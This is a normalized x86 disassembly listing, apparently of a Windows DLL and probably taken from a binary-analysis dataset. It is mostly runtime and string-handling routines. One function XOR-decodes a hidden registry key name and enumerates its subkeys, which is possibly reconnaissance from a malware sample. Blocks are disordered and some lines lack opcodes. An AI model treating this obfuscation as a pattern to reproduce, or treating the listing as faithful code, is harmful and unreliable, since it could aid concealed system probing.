add esp 0x4
mov [ esp + 0x34 ] eax
test edi edi
je r-xdata
lea ecx [ esp + 0x3c ]
push ecx
mov ecx [ esp + 0x38 ]
call sub_10069c00
mov ecx 0x1
mov [ esp + 0x68 ] ecx
mov al [ ebx ]
cmp al 0x2b
je r-xdata
push 0x0
lea ecx [ esp + 0x20 ]
call sub_1000c927
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov [ esp + 0x18 ] ecx
cmp al 0x2d
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ esp + 0x1c ]
not esi
call sub_10003c9c
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ esp + 0x3c ]
cmp al 0x30
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov eax [ esp + 0x28 ]
mov esi [ eax + 0x20 ]
mov ecx eax
cmp [ ecx + 0x24 ] 0x0
jl r-xdata
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ esp + 0x18 ] 0x0
jmp r-xdata
mov al [ ebx + 0x1 ]
cmp al 0x78
je r-xdata
xor esi esi
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ esp + 0x3c ]
mov ecx [ esp + 0x50 ]
mov edx [ esp + 0x3c ]
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ esp + 0x18 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ esp + 0x34 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
movzx eax ax
push eax
mov eax [ esp + 0x18 ]
push eax
push ebx
mov ebx [ esp + 0x30 ]
push ecx
push edx
lea eax [ esp + 0x48 ]
push eax
push ebx
call sub_1001e850
mov ecx [ eax ]
mov edx [ esp + 0x44 ]
add esp 0x1c
push esi
mov esi [ esp + 0x34 ]
push edi
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push esi
push ebx
mov [ ebp + 0x14 ] eax
mov [ edx + 0x20 ] 0x0
mov [ edx + 0x24 ] 0x0
call sub_10024610
add esp 0x18
cmp [ esp + 0x50 ] 0x10
jb r-xdata
cmp eax 0x100
je r-xdata
mov eax [ esp + 0x14 ]
cmp esi eax
jbe r-xdata
test esi esi
je r-xdata
cmp ecx 0x10
jae r-xdata
mov eax esi
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ esp + 0x3c ]
push ecx
call sub_1000a86e
add esp 0x4
mov ecx [ esp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
push ecx
push ebx
push edx
mov edx [ esp + 0x30 ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
push edx
call sub_10003150
mov ecx [ eax ]
add ebx [ esp + 0x30 ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ esp + 0x30 ]
sub [ esp + 0x2c ] ecx
push esi
mov [ ebp + 0x14 ] edx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edi
push edx
mov edx [ esp + 0x48 ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
push edx
call sub_10024610
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
add esp 0x30
mov [ ebp + 0x14 ] edx
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push esi
push edi
push ecx
mov ecx [ esp + 0x30 ]
push edx
lea eax [ esp + 0x2c ]
push eax
push ecx
call sub_10024610
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
jmp r-xdata
sub esi eax
jmp r-xdata
mov esi [ esp + 0x14 ]
mov eax edx
mov al [ eax ]
mov [ esp + 0x1c ] edx
cmp al 0x7f
je r-xdata
lea edx [ esp + 0x3c ]
xor esi esi
mov eax [ ecx + 0x14 ]
mov edi [ ebp + 0x1c ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
test al al
jle r-xdata
mov ecx esi
sub ecx [ esp + 0x18 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub esi eax
mov eax [ esp + 0x14 ]
sub eax esi
inc eax
push eax
lea edi [ ebx + esi ]
push edi
push eax
lea edx [ ebx + esi + 0x1 ]
push edx
call sub_10061520
mov eax [ esp + 0x2c ]
inc [ esp + 0x24 ]
add esp 0x10
mov [ edi ] 0x0
cmp [ eax + 0x1 ] 0x0
jle r-xdata
mov al [ eax ]
cmp al 0x7f
jne r-xdata
inc eax
mov [ esp + 0x1c ] eax
sub_10012468
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_100718ba
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_100124be
push 0x34
mov eax sub_10085279
call sub_10047689
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ edi ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
xor esi esi
xor edx edx
mov [ ebp - 0x40 ] eax
cmp cx si
je r-xdata
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] 0x0
call sub_10021130
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] 0xfffffffe
mov [ ebp - 0x34 ] 0x1
mov eax ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005b50
mov eax [ ebp - 0x3c ]
call sub_100262c3
retn
movzx eax [ edi + ebx * 2 ]
test ax ax
je r-xdata
inc edx
movzx eax [ edi + edx * 2 ]
cmp ax si
jne r-xdata
inc [ ebp + 0x10 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
movzx ecx [ edi ]
cmp ax cx
jne r-xdata
cmp [ eax + esi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
inc ebx
movzx eax [ edi + ebx * 2 ]
test ax ax
jne r-xdata
add ebx [ ebp - 0x34 ]
movzx eax [ edi + ebx * 2 ]
cmp ax [ edi ]
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp ax cx
je r-xdata
push 0x7f
pop ecx
cmp [ ebp - 0x34 ] ecx
jae r-xdata
test ax ax
je r-xdata
movsx eax [ eax + esi ]
add ebx eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x34 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_1002839c
test al al
jne r-xdata
inc esi
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0x3c ] esi
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
cmp ecx 0x7f
jb r-xdata
mov ecx [ ebp - 0x38 ]
cmp [ ecx + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x7f
pop ecx
mov ax [ edi + ebx * 2 ]
cmp ax [ ecx + 0x6 ]
jne r-xdata
call sub_100255aa
mov ecx [ ebp - 0x38 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_1002839c
test al al
jne r-xdata
mov [ eax + esi ] cl
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
call sub_1000eff4
or [ ebp - 0x3c ] 0xffffffff
jmp r-xdata
xor ebx ebx
xor esi esi
mov [ ebp - 0x2d ] 0x0
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
sub_10012634
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_1005f1fb
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_1001b2d2
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_100126d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100879d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov esi [ ebp + 0x8 ]
cmp esi 0x1ffffff
jbe r-xdata
mov eax [ edi + 0x8 ]
sub eax [ edi ]
sar eax 0x7
cmp eax esi
jae r-xdata
push r--data
call sub_10030594
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx esi
call sub_100236d0
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov edx [ edi + 0x4 ]
mov ecx [ edi ]
push ebx
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_100225a0
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
mov ebx ecx
add esp 0xc
sub ebx eax
mov [ ebp - 0x18 ] ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
shl esi 0x7
add esi eax
and ebx 0xffffff80
add ebx eax
mov [ edi + 0x8 ] esi
mov [ edi + 0x4 ] ebx
mov [ edi ] eax
mov esi eax
cmp esi ecx
je r-xdata
mov ecx [ edi ]
push ecx
call sub_1000a86e
mov esi [ ebp + 0x8 ]
add esp 0x4
call sub_10051380
sub esi 0xffffff80
cmp esi [ ebp - 0x18 ]
jne r-xdata
sub_100127c0
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x2c ] cx
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov eax [ esi + 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] ax
je r-xdata
mov edx [ esi + 0xc ]
push edx
call sub_1000a86e
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10012830
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test edx edx
je r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_10030594
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
cmp ecx 0x10
jb r-xdata
cmp edx eax
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_10030594
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10045c60
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
mov edi [ esi + 0x10 ]
add edi eax
cmp edi edx
jbe r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
push ecx
sub edx eax
push edx
push esi
mov ecx esi
call sub_10004e10
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
sub edx eax
push edx
push esi
mov ecx esi
call sub_10004e10
pop edi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
pop ebx
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
push edx
mov edx [ esi + 0x10 ]
add edx eax
push edx
call sub_1007f580
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10012950
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
push eax
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov edx 0x7ffffffe
call sub_10072780
test eax eax
js r-xdata
sub_10012981
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x14 ]
push eax
push 0x0
push 0x3a
call sub_10030ff0
mov ebx [ ebp + 0x24 ]
movzx eax ax
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x8 ]
push eax
push 0x17
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001be36
mov esi [ ebp + 0x20 ]
add esp 0x24
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ax [ ebp - 0x4 ]
cmp [ ebp + 0x12 ] ax
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
lea ecx [ ebp + 0xc ]
call sub_1000eff4
lea eax [ ebx + 0x4 ]
push eax
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001be36
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000eff4
push ebx
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001be36
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_10012a59
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10037f3d
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10012b00
push esi
mov esi ecx
cmp [ esi + 0xec ] 0x0
jne r-xdata
mov eax [ esi + 0x6c ]
push ebx
push edi
lea ebx [ esi + 0x5c ]
push r--data
xor edi edi
mov ecx ebx
call sub_100449d0
mov edi 0x8
test eax eax
jne r-xdata
mov eax 0x64
pop esi
retn
cmp [ ebx + 0x14 ] edi
jb r-xdata
cmp [ esi + 0x54 ] edi
lea eax [ esi + 0x40 ]
jb r-xdata
cmp [ esi + 0x54 ] edi
lea eax [ esi + 0x40 ]
jb r-xdata
mov ebx [ ebx ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ esi + 0xc4 ]
call eax
jmp r-xdata
mov eax [ eax ]
mov ecx [ esi + 0xc4 ]
push 0x0
push 0x0
push ebx
push 0x3
push eax
call ecx
mov eax [ eax ]
mov ecx eax
mov [ esi + 0xb8 ] eax
test ecx ecx
jne r-xdata
cmp [ esi + 0x18 ] edi
lea eax [ esi + 0x4 ]
jb r-xdata
pop edi
pop ebx
lea eax [ ecx + 0x1 ]
pop esi
retn
movzx edx [ esi + 0x20 ]
push 0x0
push edx
push eax
mov eax [ esi + 0xd0 ]
push ecx
call eax
mov [ esi + 0xbc ] eax
test eax eax
jne r-xdata
mov eax [ eax ]
pop edi
pop ebx
xor eax eax
pop esi
retn
mov ecx [ esi + 0xb8 ]
mov edx [ esi + 0xd4 ]
push ecx
call edx
pop edi
pop ebx
mov [ esi + 0xb8 ] 0x0
mov eax 0x2
pop esi
retn
sub_10012bf0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
mov ecx esi
sub ecx eax
push ecx
push eax
push edx
call sub_1007f580
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0xc
sub_10012c20
push ebp
mov ebp esp
push 0xffffffff
push sub_10089bc7
mov eax [ fs : 0x0 ]
push eax
sub esp 0x23c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
xor ebx ebx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_10006be0
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x218 ]
push ebx
push ecx
call sub_1007f8f0
add esp 0xc
lea ecx [ ebp - 0x218 ]
call sub_10063850
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x238 ]
cmp esi ebx
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x23c ]
mov [ ebp - 0x23c ] ebx
mov [ ebp - 0x238 ] ebx
call sub_100310b0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x23c ] ebx
jne r-xdata
push 0x1
call sub_1002e3ac
add esp 0x4
push eax
lea ecx [ ebp - 0x244 ]
mov [ ebp - 0x244 ] ebx
mov [ ebp - 0x240 ] ebx
call sub_10002ce0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x244 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x238 ]
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea ecx [ ebp - 0x23c ]
call sub_1001ee70
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov esi [ ebp - 0x23c ]
call sub_10055c60
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ecx esi
call sub_10027ec0
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0x5
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ecx esi
call sub_10054010
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0x6
jmp r-xdata
mov ecx esi
call sub_1006be60
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0x7
jmp r-xdata
mov eax esi
call sub_1002c600
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0x8
jmp r-xdata
lea ecx [ ebp - 0x23c ]
call sub_1002bf80
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0x9
jmp r-xdata
mov ebx [ ebp - 0x23c ]
lea esi [ ebp - 0x234 ]
mov edx ebx
call sub_10071b00
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x3
call sub_10033f90
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_100702e0
mov esi r--data
mov ecx rw-data
call sub_10045dd0
test al al
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0xb
jmp r-xdata
mov esi r--data
mov ecx rw-data
call sub_10045dd0
test al al
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0xc
jmp r-xdata
push rw-data
mov edx ebx
mov ecx rw-data
call sub_100325e0
add esp 0x4
test eax eax
je r-xdata
lea esi [ ebp - 0x234 ]
mov edx ebx
call sub_10013eb0
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x4
call sub_10033f90
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_100702e0
mov esi r--data
mov ecx rw-data
call sub_10045dd0
test al al
je r-xdata
call sub_10071980
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
xor eax eax
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0xe
jmp r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10039fc0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10039fc0
mov eax 0xd
jmp r-xdata
sub_1001307c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
push esi
call sub_1001b2d2
pop ecx
sub_100130f0
push ebp
mov ebp esp
sub esp 0x944
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x938 ] eax
mov [ ebp - 0x944 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x940 ] edx
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x36
and edx 0xff
mov [ ebp + eax * 2 - 0xbc ] dx
inc eax
cmp eax 0x33
jb r-xdata
lea ecx [ ebp - 0x930 ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0xbc ]
push edx
push 0x80000002
mov [ ebp - 0x56 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x930 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x934 ]
push eax
push 0x0
push 0x0
push 0x0
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x930 ]
push edx
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x2
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x934 ]
test eax eax
je r-xdata
push ebx
push esi
xor esi esi
push edi
test eax eax
je r-xdata
mov ecx [ ebp - 0x930 ]
push ecx
call [ RegCloseKey@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov edi [ RegEnumKeyExW@IAT ]
lea esp [ esp ]
mov eax [ ebp - 0x930 ]
push eax
call [ RegCloseKey@IAT ]
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x1c ]
mov eax 0x4
call sub_10019570
lea edx [ ebp - 0x124 ]
mov eax 0x7
call sub_10019570
lea edx [ ebp - 0x92c ]
push edx
lea eax [ ebp - 0x124 ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx 0x104
lea ebx [ ebp - 0x52c ]
call sub_1006d3c0
lea edx [ ebp - 0x34 ]
mov eax 0x13
call sub_10019570
push 0xff
lea edx [ ebp - 0x324 ]
push edx
lea eax [ ebp - 0x34 ]
push eax
mov ecx ebx
mov edx 0x80000002
call sub_1006a230
add esp 0x18
test eax eax
jne r-xdata
inc esi
cmp esi [ ebp - 0x934 ]
jb r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x5
call sub_10019570
push 0xff
lea ecx [ ebp - 0x72c ]
push ecx
push edx
mov ecx ebx
mov edx 0x80000002
call sub_1006a230
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebp - 0x930 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x93c ]
push edx
lea eax [ ebp - 0x92c ]
push eax
push esi
push ecx
